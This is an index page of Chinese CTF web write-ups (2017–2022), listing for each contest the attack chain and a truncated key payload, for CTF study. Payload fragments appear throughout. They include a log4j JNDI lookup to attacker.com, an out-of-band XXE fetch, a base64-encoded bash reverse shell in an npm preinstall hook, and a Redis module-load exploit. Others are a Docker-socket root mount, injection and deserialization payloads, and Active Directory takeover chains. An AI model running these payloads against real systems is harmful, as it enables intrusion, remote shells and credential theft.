---
title: Des-CTF 语料索引 — Web（2017-2022）（98 篇比赛 WP）
tags: [source-index, corpus, des-ctf, wp, web]
category: web
triggers: ["Solidity", "反序列化", "RCE", "XXE", "blockchain", "XSS", "PHP", "ssrf", "ERC721", "ERC20", "Foundry", "春秋杯", "child_process", "SQL注入", "Web3", "discrete_log", "Lua", "php //filter", "tcache", "JWT"]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge]
---

# Des-CTF 语料索引 — Web（2017-2022）

## Summary

外部语料库 `Dest1ny-Sec/Des-CTF-Knowledge` 中 **98 篇 Web（2017-2022） 比赛 WP**（覆盖 82 场比赛）的结构化索引。
每条记录保留「比赛 → 题目/攻击链 → 关键 payload → 要义」，原始全文未镜像，需细节时按 `contest` 回源 GitHub 的 `CTF大赛WP集合/articles/<文件名>.full.md`。

## Key Points

- 高频考点（按 tags 词频）：Solidity、反序列化、RCE、XXE、blockchain、XSS、PHP、ssrf、ERC721、ERC20、Foundry、春秋杯、child_process、SQL注入、Web3
- 高频比赛：PARADIGM CTF、春秋杯、DASCTF、Ichunqiu 云境、2022 春秋杯冬季赛、HITCON CTF 2022、2022 羊城杯、ACTF
- tags 来自上游 frontmatter（允许跨赛道噪声，如 Web 页出现 ret2libc），仅作检索线索
- 用法：Grep 本页的比赛名或考点词 → 命中条目 → 需要细节时回源原文；不要在本页上做二次推理

## 按比赛分组

### 2017 Hack The Box - October（1 篇）
- HTB October: OctoberCMS 数据库默认密码 + RCE 写 PHP 提权 → su 切换 → 32 位 ovrflw 栈溢出 (无 Canary/PIE) → brute…；CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌…

### 2017 群赛出题（1 篇）
- 群第6期三题，etl+SMB Net-NTLM爆破+逆向flag约束方程 → `hashcat64 -m 5600 administrator:::8b1ca28f...:1c4d7b10...:010100... flag.txt`；Net-NTLM从SMB包中提取后hashcat秒破

### 2018 Hack The Box - Jarvis（1 篇）
- HTB Jarvis: supersecurehotel 房型 SQL 注入 IronWAF bypass + mysql.user 哈希 hashcat 爆 + phpmyadmin 写…；IronWAF 2.0.3 用 /**/ 绕空格检测；LFI 路径中 %253f (双 URL 编码) 绕 check 内 fil…

### Google CTF 2019（1 篇）
- Google CTF 2019 Monochromatic：Chromium Mojo IPC BeingCreatorInterface + 3 Interface UAF沙箱逃逸 → `mojo public/tools/bindings/mojom.gni;interface BeingCreatorInterface CreatePerson CreateDo…`

### 0CTF/TCTF 2020（1 篇）
- 0CTF/TCTF 2020 Chromium RCE：typed-array-set bypass+ArrayBufferDetach+UAF tcache → `var a = new Uint8Array(0x200); var b = new Uint8Array(0x200); %ArrayBufferDetach(a.buffer)…`

### HXP 2021 CTP（1 篇）
- HXP 2021 LKVM虚拟化逃逸：virtio OOB读写+JOP+execl宿主shell → `bdev->vqs[0x16] = exit_lists指针 + echo c > /proc/sysrq-trigger`；lkvm exit_lists可被OOB覆盖+内核崩溃触发宿主RCE

### 2021 全国大学生信息安全竞赛（1 篇）
- 第十四届全国大学生信安赛Web/Misc/Crypto/Re/Pwn:Web updatexml盲注+SQLMAP+PHP_SESSION_UPLOAD_PROGRESS文件包含+图片马+A… → `admin') and updatexml(0,concat(0x7e,mid((select * from(select * from flag a join (select *…`

### 2021 强网拟态（1 篇）
- notevil 注入 readFile 读 /etc/passwd + 找 cookieSession secret 伪造 session → `e = "readFile('/etc/passwd')"`；"patched" 库接受额外参数时仍可注入；cookieSession secret 用弱熵 Math.random 易被读 /…

### 2021 春秋杯（3 篇）
- PDO dsn_from_uri 触发 phar 反序列化拿 shell；PHP PDO 的 pgsqlCopyFromFile、dsn_from_uri 等内部函数可作为 phar 反序列化触发点
- 2022 春秋杯春季赛 Web 2 题 WP，EasySwoole + Redis 反序列化 + gopher 注入 + PHPUnit Mock 链 RCE。 → `EasySwooleHttpMessageUploadFile → ProphecyProphecyObjectProphecy → ProphecyDoublerLazyDoub…`
- 2021 春秋杯秋季赛 mimic-ssrf 拟态防御 + SSRF + XDebug/debugpy/JDWP 三语言 RCE 链。 → `file:///etc/passwd /proc/§1§/cmdline client_port=13000 三个异构体同时执行`；拟态防御（mimic defense）= 邬江兴院士 + 紫金山实验室；三语言异构体需一致响应通过表决；SSRF + XDebug…

### 2021 津门杯（1 篇）
- 津门杯：.swp源码+反序列化+flflag双写+gopher SSRF+时间盲注+USB流量 → `.index.php.swp;gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0A;mid((select g…`；.swp文件vim临时文件泄露+flflag双写绕WAF+gopher://SSRF打内网HTTP

### 2021 深育杯（1 篇）
- 深育杯多方向：Java反序列化CommonsBeanutils+LLL格密码+fmtstr泄canary+elfbase+ret2libc → `BeanComparator(null, String.CASE_INSENSITIVE_ORDER);setFieldValue(templates, '_bytecodes',…`；CommonsBeanutils+TemplatesImpl+Javassist动态类是Java反序列化经典链；LLL格密码二维向…

### 2021 祥云杯（1 篇）
- 祥云杯fastjson反序列化+BCEL字节码+Codeception/Guzzle/OpisClosure多链触发system → `$$BCEL$$字节码;CodeceptionExtensionRunProcess;GuzzleHttpPsr7AppendStream/CachingStream/PumpSt…`；fastjson+BCEL+Spring路径穿越(..;)+Codeception/Guzzle/OpisClosure gadg…

### 2021 第三届数字中国虎符网络安全赛道线上赛（1 篇）
- 数字中国虎符线上赛官方WP：LD_PRELOAD+evil.so+/proc/pid/fd/fd多线程爆破RCE → `LD_PRELOAD=/proc/pid/fd/fd;Thread for pid 12-40 fd 1-40;evil.so动态库;HTTP/1.1 packet构造`；上传.so文件通过LD_PRELOAD环境变量RCE；/proc/pid/fd/枚举打开文件描述符

### 2021 长安杯（1 篇）
- 长安杯2021:Web JWT+SSTI用户字段URL_for.__globals__.os.popen(request.args.cmd)/Pwn菜单add/edit/delete/sho… → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuK…`

### 0CTF/TCTF 2022（1 篇）
- Solidity 0.8.15 calldata tuple head overflow + 数组 swap 删除 + approve 钩子 → `I, the issuer\`；Solidity 编译器 bug 是 web3 CTF 高级考点；upgradeable 数组 swap 删除要小心 order…

### 2022 DSCTF 决赛（1 篇）
- 6 题综合：Spring Boot SSRF + Jinja2 SSTI + PHP iconv + RSA + libc-2.27 堆 → `SLAVEOF 121.4.124.62 6666 / CONFIG SET dir /tmp / config set dbfilename exp.so / MODULE LO…`；Spring Boot heapdump + jodd-http SSRF 是 Java CTF 标配；Jinja2 attr 链…

### 2022 MOVEment CTF (Aptos / Move 语言)（1 篇）
- Aptos Move 智能合约 checkin + 三关 hello_move → `discrete_log(3123592912467026955u128) 需解`；Move 资源 + 入口函数 + script 调 entry-less 函数是 Web3 入门

### 2022 pwnhub 冬季赛（1 篇）
- pwnhub 2022 冬季赛：git-objects + TCP hexdump + CAN-bus + RSA-gcd + LLL + 长度扩展 → `gcd(RSA1, N) = s → invert(e, s-1) → pow(c, d, s)`；PCAP 协议逆向 + git-objects 还原是 MISC 入门；gcd(RSA1,N) 是 RSA 经典；LLL 双明文恢…

### 2022 强国杯东部初赛（1 篇）
- 强国杯东部 2022：md5 弱类型 + LFI + 反序列化逃逸 + session-upload LFI → `O:4:"main":1:{s:11:"\0*\0ClassObj";O:4:"evil":1:{s:10:"\0evil\0file";s:18:"system("cat /f*…`；PHP '__construct' 自动调用是反序列化入门；session.upload.progress LFI 是经典；0e…

### 2022 强网杯青少年专项赛（1 篇）
- 强网青少年赛 6 大题：data:// LFI + Python 反序列化链 + LSB + 二维码排列 → `?file=data://,1111&content=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0eXBlIGluZGV4LnBocC…`；data:// 协议 + fopen + fputs + include 是 LFI 经典；青少年赛偏基础 + 趣味

### 2022 春秋杯冬季赛（2 篇）
- 春秋杯 2022 冬季赛 6 大题：.NET + ASP.NET Razor + Python game + DCT + 位旋转 + Go → `DCT 逆变换 an = sum(val[x][1] * cos(-2πxn/N)) / N`；.NET Gadget 链 + ASP.NET Razor 反射是高级 web；/proc/self/mem 写 shellcod…
- 春秋杯 2022 冬季赛：PHP 下划线弱类型 + 零宽隐写 + Python 字节码 → `flag = (flag[i] >> 5 / flag[i] << 3) & 255`；Python 字节码是 reverse 入门利器；PHP 下划线数字 ('1_11') 是弱类型；零宽隐写是 misc 经典

### 2022 电信/互联网行业职业技能竞赛（1 篇）
- 2022 电信职业技能赛：xor 0x70 + binwalk + CRC 碰撞 + ddddocr SQL 异或 + RSA → `1'^(ascii(substr(database(),{0},1))={1})^'1`；异或 SQL 注入绕过关键字是经典；CRC 碰撞短文件名密码是 misc 入门；费马小定理分解 RSA

### 2022 羊城杯（2 篇）
- 2022 羊城杯 rce_me：php://filter + base64 + iconv 链 + hxp includer's revenge → `PD89YCRfR0VUWzBdYDs7Lyo (base64 of '<?='$_GET[0]';;/*')`；php://filter 链是高级 LFI；iconv 链字符集转换是 CTF 经典；黑名单绕过要找对应字符
- 2022 羊城杯 web 4 题：pearcmd LFI + PHP 反序列化 3 题 + 文本到图像 stego → `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`；pearcmd config-create 是 LFI 经典；PHP 反序列化 __wakeup/__set/__call 链是基…

### 2022 腾讯 T-Star 高校挑战赛 (未知之境)（1 篇）
- Flask SQLi + XXE OOB data exfil + Android backup 解包 → `Content-Type: application/xml + OOB XXE to http://vpsip/test.dtd`；Flask session 密钥泄露 + XXE OOB 数据外带是 web 中级标配

### 2022 虎符 CTF（1 篇）
- 2022 虎符 CTF Java：log4j JNDI + Spring Cloud SpEL + Fastjson 反序列化 → `${jndi:ldap://attacker.com/Exploit}`；2021 年底 log4j Log4Shell 是 Java 生态最大 0day；Spring + Fastjson 是高频漏洞

### 2022 ACTF（2 篇）
- ACTF 综合多题 — XOR爆破 + zstd循环解压 + RSA e=-1 方程 + libc-2.27 堆菜单 + aarch64 ret2csu 2048 AI + RunPE Pr…；ACTF 风格是把所有方向都做一遍；Process Hollowing 的关键是 FindResourceW 找 PE 资源；Bi…
- ACTF by SU — Shellshock BASH_FUNC_env + WebSocket prototype pollution XSS + JSON.stringify/pars…；Shellshock 用 BASH_FUNC_env%% 函数导出名做 RCE;JSON.stringify/parse 钩子是…

### 2022 ASIS CTF（1 篇）
- ASIS 2022 Quals 狼组复盘 — eval f.name 拿 flag + ret2libc 二次 payload + (a+1)^n mod n^3 还原 + Chaffyma…；Python eval 配合文件描述符 f.name 泄露路径;mod n^3 后 (a+1)^n 剩 3 项 (m + m(m-…

### 2022 AWD 入门（1 篇）
- AWD 入门攻略 — nmap 扫存活+服务+端口 + find 配置文件 + 不死马 (usleep 5000) + crontab 5分钟反弹 + mysqldump + 找可写目录 +…；AWD 节奏是 1) 找后门 2) 写后门 3) 修后门 4) 拿 flag;不死马通过 usleep + while 循环 fi…

### 2022 Apiculture（1 篇）
- Apiculture 1 API 渗透 — /api/products 泄露 vendorID + /api/swagger.json 找 /api/flags/ + /api/vendor…；API 渗透标准链: 端点泄露字段 → swagger.json 找受保护端点 → IDOR 试错 admin → 弱密码爆破;v…

### 2022 Blockchain CTF（1 篇）
- 以太坊假充值攻击 — Solidity ERC-20 transfer/transferFrom 返回 false 不回退 + Exchange enter() 不检查 transferFr…；Solidity 0.8.0 之前 transfer 不回退是经典假充值漏洞;防御: SafeERC20.safeTransfer…

### 2022 Buuctf（1 篇）
- Buuctf 3 题合集 — 刮开有奖 DialogFunc 8 字符 + 快排 + base64 编码比较 + 简单注册器 APK 32 字符 + dd2940c0... XOR + re…；字符串比较题多步:输入字符串 → 数组排序 → base64 编码 → 多重比较;APK 注册码常用 char[] + char…

### 2022 ByteCTF（1 篇）
- ByteCTF 2022 综合 — clickhouse URL() SSRF 提权 + DNS bit 0/1 转 ASCII + 汉信码/RX-SSTV + bytezoom pwn 狗…；clickhouse URL() 是 SSRF 提权经典;DNS o/i 域名后缀隐写 0/1 bit 是常见 misc tric…

### ByteCTF 2022（1 篇）
- ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig → `preinstall = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==/base64 -d/…`；npm preinstall script 是供应链攻击面；CVE-2021-43798 Grafana 文件读是经典

### CODEGATE 2022 Finals（1 篇）
- CODEGATE 2022 Finals区块链题 Look It Up，3层proof验证 → `web3.sha3(text="isSolved()")[:4] → solved() call`；Paradigm CTF框架部署区块链题，需10000 ether绕过+构造f/t/s1/s2

### 2022 DASCTF（3 篇）
- DASCTF 2022 十月赛 Web 入门题集，5 层 PHP 反序列化 POP + file.php 源码泄露 + SUID 提权。 → `5 层 POP 链 + system 触发`；PHP 反序列化 POP 链构造的关键是"找到包含可调用方法的对象作为下一个对象的属性"。
- DASCTF 2022 7 月赋能赛官方 WP，4 Web + 4 Misc + 取证综合。 → `SSTI unicode 编码 + phar 反序列化 + 推理密码`；当 SSTI 过滤了 '__class__' 等关键字，unicode 编码 '\u005f\u005f...' 是万能绕法。
- DASCTF 2022 5 月出题人挑战赛官方 WP，6 Web + 6 Misc + 3 Crypto + 2 Pwn。 → `Apache 2.4.50 目录穿越 + MT19937 符号执行`；golang web 框架的 SSTI 比 Python 难利用，但模板渲染时同样注入 . 用 {{.}} 即拿到 key。

### DASCTF 2022 11月（1 篇）
- 3 题：MongoDB 正则盲注 + Squirrelly RCE + XTEA 变种/SMC 逆向。；Squirrelly 默认 autoEscape:true 关闭 → filter 参数 RCE；XTEA 变种关键是 delta…

### 2022 DASCTF+CBCTF（1 篇）
- DASCTF X CBCTF 2022 九月赛官方 WP，涵盖 SSTI/JS 原型污染/Spring 内存马。 → `SSTI 反转 + JS 原型污染 + Spring 内存马`；"JavaMaster" 这类无出网 Spring 内存马是现代 CTF WEB 高频考点。

### Ekoparty 2022 CTF (GitHub)（1 篇）
- GitHub Ekoparty 2022：3关Python加密+Actions+DOMPurify XSS → `hex(p)[2:] + "/" + hex(t)[2:] # URL`；GitHub Actions pull_request_target可拿secrets.FLAG

### FE-CTF 2022（1 篇）
- FE-CTF Hug Me Squeeze Me：ELF彩蛋+libsqz.so LZMA压缩+OOM Kill → `_STRIP_ELF_BEFORE_CTF_ = 0x1337 # ELF彩蛋`；替换 libsqz.so 为空库可绕过OOM Kill

### HITCON CTF 2022（2 篇）
- HITCON 字符级增量 cookie 爆破 + NodeJS child_process RCE + Windows 驱动 IOCTL → `global.a1='child'; a1=a1+'_process'; b=require(a1); c1='cat /flag-...'; b.exec(c1)`；增量 cookie 响应可逐字符爆破服务端代码；Windows 驱动 IOCTL 0x222000 是 32 字节间隔的 disp…
- HITCON CTF 2022 web2pdf：mpdf SVG PolyPolygon解析错误泄露flag → `hitcon{Parse_Document_Failed_QAQ_aOHiV6hD9wp29yYim3HJc1G5sbuiToskIiHRTCaq6iw}`；PDF解析库的SVG/WMF多边形指令可触发Parse Error泄露

### 2022 IChunQiu云境-Spoofing（1 篇）
- IChunQiu云境Spoofing赏金猎人WP,Tomcat GhostCat读web.xml+MS17-010内网打域+PetitPotam+WebClient NTLM中继+RBCD攻… → `CNVD-2020-10487 + PetitPotam + RBCD + nopac`；Tomcat AJP GhostCat (CNVD-2020-10487) 是稳定的web入口;PetitPotam+WebCli…

### 2022 IS河南工控安全（1 篇）
- 4 道 Web：二次注入 + 经典 XXE + JSON array_search 弱类型 + load_file 非预期。；SQL 注入过滤 select 可用 selselectect 大小写混写；JSON 弱类型是 array_search 经典坑。

### 2022 Ichunqiu 云境（3 篇）
- Oracle 注入 + Java Source 创建 + dbms_cdc_publish 提权 + pboot CMS 后台命令执行 + 大型内网域渗透拓扑。 → `/`；/
- OSCP 风格渗透：Fastjson JDBC RCE → Exchange Proxylogon → NTLM Relay DCSync → 邮箱导出 PKZIP 跑字典。 → `/`；/
- MSSQL 弱口令 → Potato 提权 → incognito 模拟 token 拿 \tsclientC 凭据 → 镜像劫持/krbrelayup 提权 → DCSync 带走 DC。

### 2022 Jade CTF（1 篇）
- Jade CTF 2022 多类目 writeup (HTTP request smuggling via WebSocket upgrade / Jinja2 SSTI / vol.py…

### 2022 MRCTF（1 篇）
- MRCTF 2022 stuuuuub: Android 一代壳 (JNI_OnLoad + /readflag 算术) + dompdf CVE-2022-28368 字体 RCE + K…

### N1CTF 2022（1 篇）
- N1CTF 2022：struts2 LFI + cmd 痕迹 md5 + knapsack lattice + ECDLP → `md5('C:\Program Files (x86)\Windows NT\Accessories\flag.zip') = 0d3ba7db468bdbd4f93a88c97b…`；cmd 痕迹 = 取证金矿；knapsack lattice 是经典格密码；ECDLP 130-bit 可用 Pohlig-Hel…

### 2022 NahamCon EU（1 篇）
- NahamCon EU CTF 2022 Welcome to Web3!: Airdrop.sol 4 元素 Merkle proof 验证, 改 proof[0]=account.add… → `/`；/

### 2022 PARADIGM CTF（5 篇）
- PARADIGM CTF 2022 rescue: MasterChefHelper.sol + Uniswap V2 addLiquidity 按比例添加, 凑足 DAI 比例转走 10… → `/`；/
- PARADIGM CTF 2022 Source Code: 自构造 EVM bytecode (PUSH32 + DUP1 + MSTORE + RETURN) 让合约 bytecode… → `/`；/
- PARADIGM CTF 2022 Lockbox2: 5 stage 函数全部 call 成功 + secp256k1 ECDSA 私钥爆破 (公钥 0x00 开头)。 → `/`；/
- PARADIGM CTF 2022 Vanity: ECDSA 签名 vanity address (16 字节 0x00) + isValidSignatureNow 验证。 → `/`；/
- ERC777 重入 + 函数签名碰撞嵌套 approveAndCall 转走 vault 全部代币 → `register ERC1820 hook for from/to → withdraw → reenter deposit → loop`；任何外部回调（不只是 ETH transfer）都可能造成重入；函数签名碰撞可用于跨合约调用伪装

### RCTF 2022（1 篇）
- Prettier .prettierrc.js RCE + Lua XXTEA 变种 + srand 爆破 → `parser = .prettierrc + _load('child_process').execSync('/readflag')`；Prettier 配置 RCE 是 npm 供应链攻击典型；Lua TEA 变种是 reverse/crypto 入门

### SECCON CTF 2022 Quals（1 篇）
- SECCON CTF 2022 Quals 5 题：qs 1000 参数 limit 绕过 + Flask curl file:// LFI WAF 绕过 + HTTP 请求走私偷 Http… → `SECCON_BASE_URL=/report POST {expr: xssPayload} + contentLength=24 evilHeader q-encoded`

### SWPUCTF 2022（1 篇）
- SWPUCTF 2022 8 大题：F12 + 联合注入 + RCE 字符绕过 + 反序列化 + JWT + XXE → `/jiangnaij.php?url=$_GET[Tao]($_GET[c]);&Tao=system&c=cat+/f*`；PHP '$_GET[$x]($y)' 动态调用绕 cat/flag 过滤是经典；JWT alg:none 是入门 web

### 2022 TCTF/0CTF 3rm1（1 篇）
- 通过 Java 动态代理 + 反射修改 InvocationHandler.object 字段实现 AOP 链式攻击。；Java 反序列化链常与动态代理耦合，Proxy.newProxyInstance + InvocationHandler 可实现…

### 2022 TQLCTF（1 篇）
- TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。 → `assert($_POST[_]) // 无字母 RCE`；LLL + 梯度下降 4 维可以恢复 lattice 私钥的 4 个基向量；pwnable 中 nesemu 是稀有 IoT 模拟…

### 2022 TryHackMe（1 篇）
- TryHackMe Overpass：gobuster + ssh2john 爆破 + rot47 密码 + /etc/hosts 劫持 cron 反弹 root。 → `/etc/hosts hijack overpass.thm`；Linux cron 服务 crontab 引用域名时，本地 /etc/hosts 优先级最高 → cron 域名劫持是真实持久化…

### VNCTF 2022 PDC面壁计划（1 篇）
- aiortc WebRTC 证书从 RSA 改 EC + token 验证 substring PK 漏洞，借伟思身份 WebRTC 拿 flag。；字典 key in user_substring 漏洞 (应该用 == 严格匹配)；WebRTC 内网穿透靠 TUN/STUN 公…

### WMCTF 2022 (W & M CTF)（1 篇）
- WMCTF 2022 4 大题：CVE-2022-28927+QuickJS+Hadoop SSRF+Jeecg path traversal → `QuickJS: std.popen(''/readflag > /app/flag1;/app/readflag > /app/flag2'', ''r'')`；QuickJS std.popen 沙箱逃逸；Spark doAs URL 编码绕过；Jeecg 路径穿越 /..;/ 是经典

### bi0sCTF 2022（1 篇）
- bi0sCTF 2022 Vuln-Drive 2 WAF 绕过，HTTP smuggling 把含 SQL 注入的 HTTP 请求塞进 multipart 上传，绕过 waf 直达内网 a… → `X-pro-hacker: Pro-hacker + flag: gimme + Content-Type: application/x-www-form-urlencoded +…`

### 2022 idekCTF（1 篇）
- idekCTF 2022 r3kapig 战队 Web + Crypto：Go 验证器顺序读 + 固定种子。 → `Go validator context 链 + 随机种子 1337`；Go rand.Seed(1337) + 24576 字节随机数 + 已知 password 偏移是经典的"复现随机序列"题目。

### 2022 lineCTF（1 篇）
- lineCTF 2022 Gotom 题复现：Go JWT + text/template 注入。 → `Go template SSTI + JWT secret 伪造`；Go text/template 也是 SSTI 攻击面，{{.}} 直接输出上下文对象。

### 2022 paradigm（1 篇）
- paradigm 2022 Rescue 区块链题，SushiSwap LP 池重入。 → `addLiquidity 不检查 amountOut + 重入`；''addLiquidity 的 minAmountOut 不检查 = 任何人都能抽干 LP 池。''

### 五月公开赛 2022（1 篇）
- PHP 笔记导出支持 zip/tar 自切换，title 字符过滤不严可注 Phar 元数据触发反序列化。；PHP PharData/ZipArchive 写文件时如果元数据可控，可用 phar:// wrapper 触发反序列化；tit…

### 2022 华为杯（1 篇）
- 华为杯 2022 研究生国赛初赛 EDI 安全战队 WP，Web HS256 伪造 + URL 对象 bypass / Crypto 四层 LCG / Re angr / Pwn 栈迁移四方… → `HS256 伪造 JWT: payload={isAdmin:true, username:"admin", home:{href:"ank1e", origin:"ank1e",…`

### 台州市赛 2022（1 篇）
- Java AWD：User.password 触发命令执行，fastjson+CC3/4+ROME 链外带 flag。；Java AWD 优先找 readObject 入口；fastjson-local-echo 是不出网时的盲打回显神器。

### 2022 四川省信息安全技术大赛 AWD（1 篇）
- 四川省信安 AWD 复盘: PHP 命令执行/SQL/上传修复 + Python Flask SSTI 批量攻击每轮 4000+ 分。；AWD 修复策略: 1) 删漏洞代码/修 TRUE→FALSE/加白名单; 2) webshell 查杀; 3) 备份源代码; 4…

### 2022 多个CTF题目精选(JS+Web)（1 篇）
- 5题Web+JS小记:Node原型链污染触发npm preinstall RCE/Proxy拦截/Fastify x-token/innerHTML SVG onload/unhandled… → `Object.prototype.data = {exports:{"./pwn.js"},name:'./usage.js'} + prototype.shell + proto…`

### 2022 安洵杯（1 篇）
- 安洵杯2022全方向多题:Web PHP反序列化(POP链A→B→C→A.uwant→call_user_func+SoapClient SSRF→SplFileObject读f1111ll… → `SoapClient(null,array(''location''=>''http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111ll…`

### 2022 山东省大学生电子设计大赛（2 篇）
- 第六届山东省赛网安赛题合集(Web upload_100+pop_200+Crypto签到/Vigenere/凯撒/三层base/MT19937/DSA+Re ezxor+arbitrary… → `#define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system/class Show…`
- M1mikatz版同题合集,完整payload:#define width 1337+UTF-7+加换行+反序列化成员数绕+MT19937逆推+DSA r1=r2+蚁剑流量+RGB二维码+e… → `# define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system+换行绕关键字/cl…`

### 2022 春秋云境靶场（1 篇）
- 春秋云境MagicRelay：Redis DLL劫持+向日葵RCE+AD CS域提权(CVE-2022-26923)+RBCD全链路 → `python3 RedisWriteFile.py --rhost ...;sunRce.exe -h ... -t rce -c 'type C:\flag02.txt';cer…`；域内AD CS证书服务+机器账户+passthecert可实现无域管密码登录域控

### 2022 春秋云镜靶场（2 篇）
- 春秋云镜Brute4Road：Redis主从+SUID+WPCargo RCE+约束性委派Rubeus S4U2Self+DCSync → `exploit/linux/redis/redis_replication_cmd_exec;base64 "/home/redis/flag/flag01";CVE-2021-2…`；域内机器账户+约束性委派可被Rubeus S4U2Self扩展代表域管访问LDAP服务导出域内凭据
- 春秋云镜Unauthorized：Docker 2375未授权+SSH公钥注入+ASP+证书委派Rubeus S4U → `docker -H tcp://47.92.205.41:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04;ec…`；Docker daemon 2375未授权+AD CS证书+Whisker/Rubeus是经典域内权限提升组合

### 2022 爬虫 CTF（1 篇）
- 猿人学 Android 爬虫第一关 — frida hook ChallengeOneFragment + Sign.sign + Python rpc.exports.callsecret…；frida + rpc.exports 是 Java <-> Python 跨语言调标准做法;byte[] 参数先 bytearr…

### 看雪2022 KCTF春季赛（1 篇）
- KCTF2022春Q4《飞蛾扑火》SSRF：parse_url与curl解析差异+123.57.254.42://127.0.0.1/../flag.php → `file://127.0.0.1/var/www/html/url.php;parse_url vs curl解析差异;123.57.254.42://127.0.0.1/../f…`

### 看雪2022 KCTF秋季赛（1 篇）
- KCTF2022秋Q5《灾荒蔓延》Web：Node.js 8 padding oracle伪造admin+CRLF HTTP走私到/C00mmmmanD执行命令 → `padding_oracle.py;json_alphabet;CRLF=u010du010a;BLANK=u0120;content-length: 75;cmd=curl%20…`

### 2022 第三届祥云杯初赛（1 篇）
- 第三届祥云杯初赛Web：CC4链+Javassist动态类+DNS外带flag+python_jwt绕认证 → `CC4:ChainedTransformer(new ConstantTransformer(TrAXFilter.class)+InstantiateTransformer)+T…`；CC链curl/wget被ban时用URL+HttpURLConnection发GET请求外带flag到oastify

### 2022 第五届强网拟态防御国际精英挑战赛（1 篇）
- 强网拟态NFT Market Revenge:伪造NFT合约ownerOf返回market+purchaseTest绕过+CouponVerifierBeta ECDSA签名。 → `FakeNFT.ownerOf返回market地址 + purchaseTest+tested复用 + CouponVerifierBeta ECDSA ecrecover`

### 2022 第五空间（1 篇）
- phar 反序列化读 /flag + 报错注入 + 命令注入 + ret2libc 三题合集 → `$phar->setMetadata(new upload(filename='/flag'))`；phar:// 是 file_exists/exif/finfo 等函数都触发的反序列化入口；${IFS} 绕过空格过滤

### 第五空间 2022（1 篇）
- 5 题：phar反序列化、rootfs crackme z3 求解、SMC 多字节异或、safevm 未完成。；phar 触发链 = 上传 phar 改 png 后缀 + file_exist 触发；crackme 远端偏移和本地不同是常见坑…

### 2022 美团CTF（1 篇）
- 4道题Web/Crypto/Re/Pwn全覆盖:easypickle(flask-unsign+pickle大小写替换绕黑名单)+babyjava(XXE+XPATH substring逐位… → `flask-unsign -u -c "eyJ1c2VyIjoibmlpbWQifQ.YyWuLQ.0cA5d6Yw0YLgq2_-ONSmWixQO0o" --wordlist…`

### 蓝帽杯 2022（1 篇）
- SUID 提权 5 种经典路径：nmap / find-exec / date -f / ftp env / SHELL hijack → `nmap --interactive → !sh / sudo nmap --script=shell.nse`；SUID 位运行 root 程序时应避免调用外部命令或保留 SHELL 路径；sudo nmap 加载 lua 脚本是 GTFOb…

### 西湖论剑 2022 WEB 初赛（1 篇）
- 2022 西湖论剑 WEB 5 题官方 WP，tomcat 解析绕过 + Spring 反序列化 toString 链 + Node 8.1.2 HTTP 拆分 + EJS 模板污染 + P… → `{"checkcode":{"length":16}} / {"constructor.prototype.outputFunctionName":"a=1; return glo…`

### 2022 跳跳糖安全社区（1 篇）
- Python pickle 全部 opcode 详解 + 4 种反序列化 RCE 攻击 (reduce/R/b/__setstate__) + RestrictedUnpickler 黑名单… → `b'c__main__\ntttang\n)x81}Xx0Cx00x00x00__setstate__cosnsystemnsbXx06x00x00x00whoamib.'`

### 2022 长安战疫（1 篇）
- 长安战疫2022多方向:无参RCE array_rand+array_flip+array_values+get_defined_vars+eval+SSTI 8进制Unicode转义+凯撒… → `?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&a=system(''…`

### 2022 阿某云WAF挑战赛（1 篇）
- 阿某云WAF挑战赛SQL注入绕语义分析:MySQL+PostgreSQL+SQL Server三大数据库/**/注释歧义+{a+换行+information_schema%23%0a.%0a…；1) 语义WAF绕:/*被双引号包裹不起注释+真注释/*+空格绕空格=WAF误判为错误语句; 2) MySQL报盲注:FIELD(…

## Connections

- 上层索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)

## Open Questions

- 本页为索引层，题目细节请回源；若某场比赛多题值得展开，再单独建 `ctf/<比赛>.md` 实体页。
